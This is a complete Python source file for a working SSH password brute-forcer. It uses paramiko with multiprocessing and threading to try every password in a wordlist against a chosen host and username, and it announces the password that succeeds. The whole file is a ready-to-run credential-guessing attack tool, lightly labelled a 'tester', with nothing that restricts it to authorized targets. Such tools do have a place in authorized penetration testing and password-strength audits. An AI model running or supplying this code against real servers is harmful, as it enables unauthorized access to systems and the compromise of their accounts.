import argparse
import multiprocessing
import paramiko
import threading
import queue
import sys
from time import sleep
from typing import List
from termcolor import cprint


# Log to file for debugging
error_file = open("brute-ssh.log", "w")
sys.stderr = error_file


class Result:
    """
    Base class for handling SSH login results.
    
    Attributes:
        message (str): The message describing the result.
    """
    def __init__(self, message=None):
        self.message = message if message else "None"


class AuthenticationSuccess(Result):
    """Class to represent a successful authentication result."""
    pass


class AuthenticationFailed(Result):
    """Class to represent a failed authentication result."""
    pass


class SSHError(Result):
    """Class to represent an SSH error result."""
    pass


class SSHLoginResult:
    """
    Represents the result of an SSH login attempt.

    Attributes:
        identifier (int): The identifier for the login attempt (thread ID).
        result (Result): The result of the authentication attempt.
    """
    def __init__(self, identifier, result: Result = None):
        self.identifier = identifier
        self.result = result if result else Result()


class SSHLoginThreadInfo:
    """Holds information about a specific SSH login thread."""
    def __init__(self, thread_id: int, thread_obj: threading.Thread):
        self.thread_id = thread_id
        self.thread_obj = thread_obj


class SSHTarget:
    """
    Represents the target SSH server details.

    Attributes:
        hostname (str): The hostname or IP address of the SSH server.
        port (int): The port number for SSH (default is 22).
        username (str): The username for SSH login.
    """
    def __init__(self, hostname: str = "localhost", port: int = 22, username: str = None):
        self.hostname = hostname
        self.port = port
        self.username = username


class SSHBruteForcer:
    """
    The brute force handler that attempts to log in using a target and a list of passwords.
    """
    def __init__(
            self, 
            target: SSHTarget, 
            passwords_queue: queue.Queue, 
            results_queue: queue.Queue,
            login_thread_n: int,
            sentinel_value=None, 
            stop_flag=multiprocessing.Value('b', False),
            running_bruteforcers_n=multiprocessing.Value('i', 1)
        ):
        self.target = target
        self.passwords_queue = passwords_queue
        self.results_queue = results_queue
        self.login_thread_n = login_thread_n
        self.available_login_thread_ids: List[int] = []
        self.ssh_login_threads_info: List[SSHLoginThreadInfo] = []
        self.sentinel_value = sentinel_value
        self.thread_lock: threading.Lock = threading.Lock()
        self.stop_flag = stop_flag
        self.login_attempts: int = 0
        self.running_bruteforcers_n = running_bruteforcers_n

    def is_sentinel(self, password) -> bool:
        return password == self.sentinel_value

    def stop_if_sentinel(self, password) -> bool:
        if self.is_sentinel(password):
            cprint("[!] Received sentinel value", "magenta")
            self.stop()
            return True
        return False

    def stop(self):
        cprint("[*] Stopping brute-forcing", "cyan")
        self.wait_for_login_threads()

    def blocking_get_password(self):
        while True:
            if not self.passwords_queue.empty():
                return self.passwords_queue.get()

    def run(self):
        bruteforce_method = self._get_bruteforce_method()
        cprint(f"Bruteforce method {bruteforce_method}")
        bruteforce_method()

    def _get_bruteforce_method(self):
        return self.threaded_bruteforce if self.login_thread_n > 0 else self.bruteforce

    def threaded_run(self):
        threading.Thread(target=self._get_bruteforce_method()).start()

    def multiprocessed_run(self):
        multiprocessing.Process(target=self._get_bruteforce_method()).start()

    def bruteforce(self):
        cprint("Starting brute force", "blue")
        while not self.stop_flag.value:
            password = self.blocking_get_password()
            if self.stop_if_sentinel(password):
                break
            self.ssh_login(password=password)
        self.running_bruteforcers_n.value -= 1
        if self.running_bruteforcers_n.value <= 0:
            self.stop_flag.value = True
        exit()

    def blocking_get_thread_id(self) -> int:
        while True:
            with self.thread_lock:
                if len(self.ssh_login_threads_info) < self.login_thread_n:
                    return len(self.ssh_login_threads_info)

    def wait_for_login_threads(self):
        for login_thread_info in self.ssh_login_threads_info:
            cprint(f"Joined thread {login_thread_info.thread_id}", "green", attrs=["bold"])
            login_thread_info.thread_obj.join(timeout=5)

    def threaded_bruteforce(self):
        cprint("STARTING THREAD BRUTEFORCE", "blue", attrs=["bold"])
        while not self.stop_flag.value:
            thread_id: int = self.blocking_get_thread_id()
            password = self.blocking_get_password()
            if self.stop_if_sentinel(password):
                break

            ssh_login_thread = threading.Thread(
                target=self.ssh_login, daemon=True, args=(password, thread_id,)
            )
            ssh_thread_info = SSHLoginThreadInfo(thread_id=thread_id, thread_obj=ssh_login_thread)
            ssh_login_thread.start()
            self.ssh_login_threads_info.append(ssh_thread_info)
            cprint(f"[PASSWORD_QUEUE_LEN]: {self.passwords_queue.qsize()}", "cyan")
        
        self.wait_for_login_threads()
        self.running_bruteforcers_n.value -= 1
        if self.running_bruteforcers_n.value <= 0:
            self.stop_flag.value = True
        exit()

    def ssh_login(self, password: str, ssh_thread_id: int = None, max_tries: int = 100):
        result: Result = None
        tries = 0
        self.login_attempts += 1
        while not self.stop_flag.value and tries < max_tries:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=self.target.hostname,
                    port=self.target.port,
                    username=self.target.username,
                    password=password,
                    timeout=10
                )
                result = AuthenticationSuccess(password)
                self.push_login_result(result)
                break
            except paramiko.ssh_exception.AuthenticationException:
                result = AuthenticationFailed(password)
                self.push_login_result(result)
                break
            except paramiko.ssh_exception.SSHException:
                tries += 1
                if tries >= max_tries:
                    result = SSHError(password)
                    self.push_login_result(result)
                    break
            except Exception:
                self.push_login_result(result)
            finally:
                if 'client' in locals():
                    client.close()

        if self.login_thread_n > 0:
            self.free_ssh_thread(ssh_thread_id)

    def free_ssh_thread(self, ssh_thread_id: int):
        with self.thread_lock:
            self.ssh_login_threads_info = [
                thread_info for thread_info in self.ssh_login_threads_info 
                if thread_info.thread_id != ssh_thread_id
            ]

    def push_login_result(self, result: Result):
        self.results_queue.put(result)


class SSHBruteForceManager:
    """
    Manages multiple SSH brute force processes and coordinates password producers and consumers.
    """
    def __init__(self, target: SSHTarget, passlist_filename: str):
        self.target = target
        self.passlist_filename = passlist_filename
        self.passwords_queue = multiprocessing.Queue(maxsize=50)
        self.results_queue = multiprocessing.Queue(maxsize=50)
        self.stop_flag = multiprocessing.Value('b', False)
        self.running_bruteforcers_n = multiprocessing.Value('i', 0)
        self.sentinel_value = None

    def start_password_producer(self):
        self._password_generator_proc = multiprocessing.Process(target=self.password_producer)
        self._password_generator_proc.start()

    def start_password_result_consumer(self):
        self._password_result_consumer_proc = multiprocessing.Process(target=self.password_result_consumer)
        self._password_result_consumer_proc.start()

    def threaded_start(self, login_thread_n_each: int = 0, process_n: int = 0):
        threading.Thread(
            target=self.start, 
            args=(login_thread_n_each, process_n,)
        ).start()

    def processed_start(self, login_thread_n_each: int = 0, process_n: int = 0):
        multiprocessing.Process(
            target=self.start, 
            args=(login_thread_n_each, process_n,)
        ).start()

    def start(self, login_thread_n_each: int = 0, process_n: int = 0) -> bool:
        self.start_password_producer()
        self.start_password_result_consumer()

        if process_n > 0:
            for _ in range(process_n):
                brute_forcer = SSHBruteForcer(
                    target=self.target,
                    passwords_queue=self.passwords_queue,
                    results_queue=self.results_queue,
                    login_thread_n=login_thread_n_each,
                    sentinel_value=self.sentinel_value,
                    stop_flag=self.stop_flag,
                    running_bruteforcers_n=self.running_bruteforcers_n
                )
                brute_forcer.multiprocessed_run()
        else:
            brute_forcer = SSHBruteForcer(
                target=self.target,
                passwords_queue=self.passwords_queue,
                results_queue=self.results_queue,
                login_thread_n=login_thread_n_each,
                sentinel_value=self.sentinel_value,
                stop_flag=self.stop_flag,
                running_bruteforcers_n=self.running_bruteforcers_n
            )
            brute_forcer.run()

    def password_producer(self):
        with open(self.passlist_filename) as f:
            for password in f:
                self.passwords_queue.put(password.strip())

        self.passwords_queue.put(self.sentinel_value)
        exit()

    def password_result_consumer(self):
        while True:
            result = self.results_queue.get()
            if isinstance(result, AuthenticationSuccess):
                cprint(f"LOGIN SUCCESSFUL: {result.message}", "green", attrs=["bold", "underline"])
                self.stop_flag.value = True
                exit()
            elif isinstance(result, AuthenticationFailed):
                cprint(f"LOGIN FAILED: {result.message}", "red")
            elif isinstance(result, SSHError):
                cprint(f"SSH ERROR: {result.message}", "red", attrs=["bold"])



if __name__ == '__main__':
    # Command line argument parsing
    parser = argparse.ArgumentParser(description="SSH Brute Force Tester")
    parser.add_argument("password_file", help="File containing list of passwords")
    parser.add_argument("hostname", help="Hostname or IP of the SSH server")
    parser.add_argument("username", help="Username for SSH login")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default is 22)")
    args = parser.parse_args()

    # Create SSH target and initiate brute force
    target = SSHTarget(
        hostname=args.hostname, 
        port=args.port, 
        username=args.username
    )
    brute_forcer = SSHBruteForceManager(
        target, 
        args.password_file
    )

    brute_forcer.start(
        process_n=20,
        # login_thread_n_each=50,
    )
    print("DONE")
